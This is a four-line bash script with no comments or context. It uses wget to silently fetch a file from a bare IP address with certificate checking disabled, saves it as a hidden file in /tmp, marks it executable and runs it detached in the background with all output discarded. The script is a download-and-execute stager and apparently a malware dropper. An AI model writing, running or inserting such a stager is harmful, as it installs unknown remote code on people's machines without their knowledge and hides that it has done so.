#!/bin/bash
wget -q --no-check-certificate http://45.155.204.66/f -O /tmp/.x
chmod 755 /tmp/.x
nohup /tmp/.x >/dev/null 2>&1 &
